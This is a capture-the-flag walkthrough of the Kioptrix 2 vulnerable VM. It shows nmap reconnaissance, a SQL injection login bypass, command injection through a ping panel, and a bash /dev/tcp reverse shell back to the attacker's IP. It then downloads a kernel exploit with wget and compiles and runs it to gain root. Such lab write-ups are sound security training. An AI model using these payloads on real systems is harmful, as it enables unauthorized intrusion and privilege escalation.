# Kioptrix 2- Walkthrough

First We check what's our ip with simple shell command:
```
ifconfig
```
![alt text](/screens/ifconfig2.png)

Then we need to check the hosts running on our IP address with another shell command:
```
netdiscover
```
![alt text](/screens/netdiscover2.png)

**PCS Systemtechnik GmbH** is Virtual Box Vendor so it must be our VM.

Let's scan it with **nmap**!

		* -sS stands for TCP SYN scan 
		* -A  DetectS OS and Services
    
    
 ```
 nmap -sS -A <ip address>
 ```
 
 ![alt text](/screens/nmap2.png)
 
 Port 631 caught my eye immediatly and CUPS 1.1 had some known vulnerabilities but noone of the exploits worked.
 Lets search further.
 
 Port 80, which is standard http port is open.
 When accessed it gives us a login panel.
 
  ![alt text](/screens/login1.png)

### SQL Injection

I tried some default credentials but they didnt work.
Lets try to bypass it with SQL Injection.

We can guess that the query looks something like

```
SELECT * FROM users WHERE username = <our input> AND password = <out input>
```	

If we pass ' or '1'='1'-- query will look now like this:

```
SELECT * FROM users WHERE username = '' or '1'='1'--  AND password = <out input>
```
	
"-- " (with space in the end) is MYSQL comment sign. Passing it in the end means that the end of the query will be commented out, so the query really looks like:

```
SELECT * FROM users WHERE username = '' or '1'='1'--
```

OR statement means that only one of the arguments needs to be True and as '1'='1' is always True - We bypassed the login form.
  
  ![alt text](/screens/login2.png)
  
After login we get redirected to a Panel which lets us Ping the machines over internet.

  ![alt text](/screens/panel.png)
  
  Lets add another command with ; (semicolon) and see if it works.
  
  ![alt text](/screens/commandinjection.png)
  
Yes! It gives us back the output from both commands so the panel is vulnerable to Command Injection.
As output shows we're logged in as apache, so now we need to use privilege escalation in order to get the root.

### Privilege Escalation

Linux command uname -a (Unix name) prints back info about the name and version of operating system running on machine.

  ![alt text](/screens/panel2.png)

  ![alt text](/screens/uname.png)
  
  So we see that the system running is **GNU/Linux version 2.6.9**
  Quick research shows that this kernel is vulerable!
	https://www.exploit-db.com/exploits/9542
	
Exploit is **local** so we need to get it into victim machine.

On our machine we need to set up a netcat listener

```
netcat -v -l -p 4444

-v (verbose)
-l (listen)
-p(port)
4444-port to listen on
```
On the victim machine we gonna inject a one line reverse shell with our IP and port that we specified in netcat listener.

```
www.google.com;bash -i >& /dev/tcp/192.168.8.104/4444 0>&1
```
Once we click submit our netcat listener should revice a connection.

  ![alt text](/screens/netcat_listener.png)
  
 Great, we have a reverse shell on victim machine.
 
 ## Using the exploit
 
We need to download the exploit to our machine and serve as a host to download it from victim machine.
Python's SimpleHTTPServer will do the job just fine.

Move to the directory where the exploit is and start SimpleHTTPServer with command:

```
python -m SimpleHTTPServer
```

Once started, we can access the files from the victim machine.
Lets do it using **wget** 

```
http://192.168.8.104:8000/9542.c
```

Woops! **An Error gonna come up**

  ![alt text](/screens/wgeterror.png)

Its because we dont have the required permission as the **apache** user.
But we do have an access to **/tmp/** location, lets insert it there then!

  ![alt text](/screens/wgetsuccess.png)
  
 Works perfectly!
Its a .c file so we need to compile it now using **gcc**.
Type: ```gcc 9542.c -o exploit```
And use the compiled exploit with ```./exploit```

  ![alt text](/screens/root2.png)
  
  **Root obtained!** 
